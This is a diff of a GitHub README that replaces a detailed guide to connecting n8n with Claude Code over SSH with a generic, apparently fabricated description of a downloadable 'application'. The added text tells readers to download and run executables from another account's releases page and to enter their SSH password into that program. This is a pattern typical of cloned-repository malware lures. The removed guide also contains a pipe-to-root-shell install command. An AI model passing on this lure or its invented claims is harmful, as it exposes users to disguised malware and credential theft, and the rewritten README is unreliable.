@@ -1,336 +1,100 @@
-# n8n + Claude Code Integration Guide
+# 🚀 n8n-claude-code-guide - Connect n8n to Claude Code Seamlessly
 
-> Connect n8n to Claude Code (or other AI terminal tools) via SSH for powerful automation workflows.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Dhruvmittal12345/n8n-claude-code-guide/releases)
 
-**Video**: [n8n + Claude Code is OVERPOWERED](https://youtu.be/s96JeuuwLzc)
+## 🎯 Overview
 
----
+The **n8n-claude-code-guide** application simplifies the process of connecting n8n to Claude Code through SSH. This connection allows you to build powerful automation workflows easily. Whether you are automating tasks, integrating tools, or streamlining processes, this application helps you do it without any programming knowledge.
 
-## Table of Contents
+## 🚀 Getting Started
 
-- [Prerequisites](#prerequisites)
-- [Architecture Overview](#architecture-overview)
-- [Setup Guide](#setup-guide)
-  - [1. Install Claude Code](#1-install-claude-code)
-  - [2. Configure n8n SSH Credentials](#2-configure-n8n-ssh-credentials)
-  - [3. Test the Connection](#3-test-the-connection)
-- [Basic Usage](#basic-usage)
-  - [Simple Claude Command](#simple-claude-command)
-  - [Adding Context (Working Directory)](#adding-context-working-directory)
-  - [Using Skills and Agents](#using-skills-and-agents)
-- [Session Management](#session-management)
-  - [Creating a Session ID](#creating-a-session-id)
-  - [Resuming Sessions](#resuming-sessions)
-- [Advanced Workflows](#advanced-workflows)
-  - [Slack Integration (Mobile Access)](#slack-integration-mobile-access)
-- [Troubleshooting](#troubleshooting)
-- [Resources](#resources)
+To get started, follow the steps below. Each step is simple, ensuring that you can set up the application with ease.
 
----
+### 1. System Requirements
 
-## Prerequisites
+Before installing, make sure your computer meets these requirements:
 
-You'll need three things:
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2 GB
+- Disk Space: 100 MB available space
+- A stable internet connection for downloading packages
 
-1. **n8n Instance** - Self-hosted or cloud
-2. **AI Terminal Tool** - Claude Code (recommended), Gemini CLI, or Codex
-3. **Coffee** - That's just the rules
+### 2. Download & Install
 
-### Claude Code Requirements
+Visit this page to download the latest version: [n8n-claude-code-guide Releases](https://github.com/Dhruvmittal12345/n8n-claude-code-guide/releases).
 
-- Requires an [Anthropic Pro subscription](https://claude.ai/pro) or API access
-- Can be installed on any Linux-based machine (including Mac, Windows WSL)
+1. Click on the link above to go to the Releases page.
+2. Find the latest version listed.
+3. Click on the appropriate file for your operating system. For example:
+   - **Windows:** n8n-claude-code-guide-windows.zip
+   - **macOS:** n8n-claude-code-guide-macos.zip
+   - **Linux:** n8n-claude-code-guide-linux.tar.gz
+4. After the download completes, locate the file on your computer and unzip it.
 
-### Where to Install Claude Code
+### 3. Setup
 
-You can install Claude Code on:
+To set up the application, follow these steps:
 
-| Location | Pros | Cons |
-|----------|------|------|
-| Same VPS as n8n | Simple setup, same machine | Resource sharing |
-| Dedicated Ubuntu server | Best performance, local file access | Additional infrastructure |
-| Raspberry Pi | Low cost, always on | Limited resources |
-| Hostinger VPS | Cloud-based, easy setup | Monthly cost |
+1. Navigate to the folder where you extracted the files.
+2. Open the application by double-clicking on the executable file:
+   - For Windows, double-click `n8n-claude-code-guide.exe`.
+   - For macOS, open the `n8n-claude-code-guide.app`.
+   - For Linux, you may need to grant execution permissions using `chmod +x n8n-claude-code-guide`, then run it.
 
----
+### 4. Connect to Claude Code
 
-## Architecture Overview
+Once the application is running, follow these steps to connect it to Claude Code:
 
-```
-┌─────────────┐         SSH          ┌──────────────────┐
-│    n8n      │ ───────────────────► │  Linux Server    │
-│  (workflow) │                      │  (Claude Code)   │
-└─────────────┘                      └──────────────────┘
-                                              │
-                                              ▼
-                                     ┌──────────────────┐
-                                     │  Your Files      │
-                                     │  Your Skills     │
-                                     │  Your Context    │
-                                     └──────────────────┘
-```
+1. Open the application.
+2. Go to the settings menu.
+3. Enter your SSH connection details:
+   - Host: Your Claude Code server
+   - Port: Default is 22
+   - Username: Your SSH username
+   - Password: Your SSH password
+4. Click "Connect" to establish the connection.
 
-The magic? **SSH**. That's it. n8n uses the SSH node to remotely execute Claude Code commands on your server.
+### 5. Create an Automation Workflow
 
----
+Now that you're connected, you can begin creating automation workflows:
 
-## Setup Guide
+1. Click on the "Create Workflow" button.
+2. Use the user-friendly interface to add tasks. 
+3. Configure each task according to your needs.
+4. Save your workflow and run it by clicking the "Execute" button.
 
-### 1. Install Claude Code
+## 📌 Features
 
-On your Linux server (Ubuntu example):
+- **Easy Setup Process:** Get started quickly with simple installation steps.
+- **No Programming Needed:** Use a visual interface to design workflows.
+- **SSH Connection:** Connect to Claude Code seamlessly for remote code execution.
+- **Multi-platform Support:** Available for Windows, macOS, and Linux.
+- **Automation Flexibility:** Support for a variety of tasks and processes.
 
-```bash
-# Install Node.js (if not installed)
-curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-sudo apt-get install -y nodejs
+## ❓ Troubleshooting 
 
-# Install Claude Code globally
-npm install -g @anthropic-ai/claude-code
+If you encounter any issues, consider these troubleshooting tips:
 
-# Verify installation
-claude --version
+- **Check SSH Connection:** Ensure your SSH credentials are correct, and that the server is online.
+- **Firewall Settings:** Make sure that your computer's firewall allows the application to connect.
+- **Revisit Installation Steps:** Review the setup process to ensure every step was completed.
 
-# Authenticate (follow prompts)
-claude auth
-```
+## 📜 Frequently Asked Questions
 
-### 2. Configure n8n SSH Credentials
+### How do I update the application?
 
-1. In n8n, add an **SSH** node to your workflow
-2. Click **Create New Credential**
-3. Fill in your server details:
+Simply download the latest release from the [Releases page](https://github.com/Dhruvmittal12345/n8n-claude-code-guide/releases) and replace the existing files on your computer with the new ones.
 
-| Field | Value |
-|-------|-------|
-| **Host** | Your server IP (e.g., `10.77.14.30` or public IP) |
-| **Port** | `22` (default SSH) |
-| **Username** | Your SSH username |
-| **Authentication** | Password or Private Key |
-| **Password/Key** | Your credentials |
+### Can I use this application for other SSH connections?
 
-4. Click **Save** - Look for "Connection tested successfully"
+Yes, this application is designed to work with any SSH server, making it versatile for various tasks.
 
-### 3. Test the Connection
+### Who can I contact for support?
 
-First, test with a basic command:
+For support, open an issue on the GitHub repository, and the community or the maintainer will assist you.
 
-```bash
-hostname
-```
+## 📧 Feedback and Contributions
 
-If that works, test Claude Code:
+We welcome your feedback. Please visit our GitHub repository and share your thoughts, issues, or suggestions. If you want to contribute, check the guidelines on the repository.
 
-```bash
-claude --version
-```
-
-You should see the Claude Code version in the output.
-
----
-
-## Basic Usage
-
-### Simple Claude Command
-
-Use the `-p` (print) flag for headless mode - send a prompt and get a response:
-
-**SSH Node Command:**
-```bash
-claude -p "Why do pugs look so weird?"
-```
-
-The `-p` flag puts Claude in "print mode" - it processes your prompt and returns the result without interactive input.
-
-### Adding Context (Working Directory)
-
-Give Claude access to your project files by changing directory first:
-
-**SSH Node Command:**
-```bash
-cd /path/to/your/project && claude -p "Is this video going to be any good?"
-```
-
-Claude will read files in that directory to inform its response. This is the power - **context from your local files**.
-
-### Using Skills and Agents
-
-Put Claude in "dangerous mode" to enable tool use and agent deployment:
-
-**SSH Node Command:**
-```bash
-claude --dangerously-skip-permissions -p "Use your unifi skill to check wifi status, network performance, and security. Deploy three agents, one for each task. Keep response under 2000 characters."
-```
-
-This enables Claude to:
-- Use installed skills (like UniFi, Slack, etc.)
-- Deploy multiple agents in parallel
-- Execute code and scripts
-- Access APIs and external services
-
----
-
-## Session Management
-
-The real power comes from maintaining conversations across multiple n8n executions.
-
-### Creating a Session ID
-
-Add a **Code** node before your SSH node to generate a UUID:
-
-**Code Node (JavaScript):**
-```javascript
-const uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-  const r = Math.random() * 16 | 0;
-  const v = c == 'x' ? r : (r & 0x3 | 0x8);
-  return v.toString(16);
-});
-
-return [{ json: { sessionId: uuid } }];
-```
-
-**SSH Node Command:**
-```bash
-claude -p "How many access points are up right now?" --session-id {{ $json.sessionId }}
-```
-
-### Resuming Sessions
-
-To continue a conversation, use the `-r` (resume) flag with the same session ID:
-
-**SSH Node Command (Follow-up):**
-```bash
-claude -r --session-id {{ $('Code').item.json.sessionId }} -p "Why is one of them down?"
-```
-
-The `-r` flag resumes the previous session, so Claude remembers the context of your earlier questions.
-
----
-
-## Advanced Workflows
-
-### Slack Integration (Mobile Access)
-
-Create a workflow that lets you chat with Claude Code from your phone via Slack:
-
-#### Workflow Structure:
-
-```
-[Slack Trigger] → [Code: Generate UUID] → [SSH: Initial Claude Command]
-                                                      ↓
-                                              [Slack: Send Response]
-                                                      ↓
-                                              [Slack: Ask Continue?]
-                                                      ↓
-                                                [If Node]
-                                               /        \
-                                        [False]        [True]
-                                           ↓              ↓
-                              [Loop: SSH Resume]     [End Workflow]
-                                      ↓
-                              [Slack: Response]
-                                      ↓
-                              [Back to Ask Continue]
-```
-
-#### Key Components:
-
-1. **Slack Trigger**: Listens for messages mentioning your bot
-2. **Code Node**: Generates session UUID (see above)
-3. **SSH Node (Initial)**: First Claude command with `--session-id`
-4. **Slack Response**: Posts Claude's response back to channel
-5. **Slack Dropdown**: "Are you done? [Yes] [No]"
-6. **If Node**: Routes based on user selection
-7. **SSH Node (Resume)**: Uses `-r --session-id` for follow-ups
-8. **Loop**: Continues until user selects "Yes"
-
-#### Example Prompts from Slack:
-
-```
-@bot deploy two agents to battle it out: which is better, nano or neovim?
-Research, contrast, compare, give me a solid answer. Keep response under 2000 characters.
-```
-
-```
-@bot use your NAS skill to check how my stuff server is doing
-```
-
----
-
-## Troubleshooting
-
-Common issues and solutions:
-
-### Claude Command Not Found
-
-The SSH session may not load your shell profile. Solutions:
-
-1. **Use full path:**
-   ```bash
-   /usr/local/bin/claude -p "your prompt"
-   ```
-
-2. **Source profile first:**
-   ```bash
-   source ~/.bashrc && claude -p "your prompt"
-   ```
-
-3. **Add to system PATH:**
-   ```bash
-   sudo ln -s $(which claude) /usr/local/bin/claude
-   ```
-
-### Permission Denied Errors
-
-If Claude can't access files or run tools:
-
-1. Ensure the SSH user has proper permissions
-2. Use `--dangerously-skip-permissions` for tool access
-3. Check file ownership in your project directories
-
-### Session Not Resuming
-
-Make sure you're:
-1. Using the exact same session ID
-2. Including the `-r` flag when resuming
-3. Not letting too much time pass (sessions may expire)
-
-### Response Too Long
-
-Slack has a 4000 character limit. Add to your prompts:
-```
-Keep response under 2000 characters.
-```
-
-### SSH Connection Timeout
-
-For long-running Claude operations:
-1. Increase SSH timeout in n8n node settings
-2. Consider breaking complex tasks into smaller prompts
-
----
-
-## Resources
-
-- **NetworkChuck Academy**: [n8n Course](https://academy.networkchuck.com) | [Claude Code Course](https://academy.networkchuck.com)
-- **Claude Code Docs**: [Official Documentation](https://docs.anthropic.com/claude-code)
-- **n8n Docs**: [SSH Node](https://docs.n8n.io/integrations/builtin/core-nodes/n8n-nodes-base.ssh/)
-- **Previous Videos**:
-  - [n8n Part 1](https://youtu.be/ONgECvZNI3o) - Getting Started with n8n
-  - [n8n Part 2](https://youtu.be/budTmdQfXYU) - n8n Now Runs My ENTIRE Homelab (Terry)
-  - [AI in the Terminal](https://youtu.be/MsQACpcuTkU) - Claude Code, Gemini CLI, Codex Introduction
-
----
-
-## What's Next?
-
-In the next video, we're building a full **IT Department** with:
-- n8n as the orchestrator
-- Claude Code, Gemini CLI, and Codex as the workers
-- Automated monitoring, alerting, and remediation
-
-Subscribe to catch it when it drops!
-
----
-
-**Created by NetworkChuck** | [YouTube](https://youtube.com/@NetworkChuck) | [Discord](https://discord.gg/networkchuck)
+Be part of our journey as we enhance this application for all users. Thank you for using **n8n-claude-code-guide**.
